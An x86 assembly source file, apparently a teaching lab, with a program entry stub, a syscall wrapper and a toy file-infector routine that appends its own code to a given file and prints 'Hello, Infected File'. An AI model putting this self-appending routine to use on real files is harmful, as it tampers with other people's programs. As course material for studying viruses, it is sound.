section .rodata:
    msg: DB "Hello, Infected File", 10, 0

section .text
global _start
global system_call
;global infection
;global code_start
;global code_end
;global infector
extern main

_start:
    pop    dword ecx    ; ecx = argc
    mov    esi,esp      ; esi = argv
    ;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
    mov     eax,ecx     ; put the number of arguments into eax
    shl     eax,2       ; compute the size of argv in bytes
    add     eax,esi     ; add the size to the address of argv 
    add     eax,4       ; skip NULL at the end of argv
    push    dword eax   ; char *envp[]
    push    dword esi   ; char* argv[]
    push    dword ecx   ; int argc

    call    main        ; int main( int argc, char *argv[], char *envp[] )

    mov     ebx,eax
    mov     eax,1
    int     0x80
    nop

system_call:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...        
    mov     ebx, [ebp+12]   ; Next argument...
    mov     ecx, [ebp+16]   ; Next argument...
    mov     edx, [ebp+20]   ; Next argument...
    int     0x80            ; Transfer control to operating system
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller


code_start:
    
    ; call infection
    ;   call infector




infection:
    push    ebp             ; Save caller state
    mov     ebp, esp
    pushad                  ; Save some more caller state

    ; Copy function args to registers: leftmost...
    
    mov     eax, 4          ; arg1 = SYS_WRITE
    mov     ebx, 1          ; arg2 = STDOUT
    mov     ecx, msg        ; arg3 = input buffer
    mov     edx, 22         ; arg4 = input buffer length
    int     0x80            ; Transfer control to operating system

    mov eax, 0              ; return value void (0)

    popad                   ; Restore caller state (registers)
    pop     ebp             ; Restore caller state

    ret                     ; Back to caller


infector:

    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local variable- return value
    pushad                  ; Save some more caller state



    ; open file
    mov     eax, 5          ; arg1 = SYS_OPEN
    mov     ebx, [ebp+8]    ; arg2 = local variable file path
    mov     ecx, 402h       ; arg3 = open for append- OR of 1024 and 2
    mov     edx, 0644       ; arg4 = permission- for r/w/exe
    int     0x80            ; Transfer control to operating system

    mov [ebp-4], eax        ; Save returned value- file descpriptor!



    ; add code to end of file
    mov     eax, 4          ; arg1 = SYS_WRITE
    mov     ebx, [ebp-4]    ; arg2 = dest file- opened file path
    mov     ecx, code_start ; arg3 = input buffer

    mov edi, code_end       ; copy code_end address
    sub edi, code_start     ; store the lentgh of the input

    mov     edx, edi        ; arg4 = input buffer length
    int     0x80            ; Transfer control to operating system



    ; close file
    mov     eax, 6          ; arg1 = SYS_CLOSE
    mov     ebx, [ebp-4]    ; arg2 = file descpriptor
    int     0x80            ; Transfer control to operating system


    popad                   ; Restore caller state (registers)
    mov eax, 0              ; return value void (0)
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret


code_end:

    ret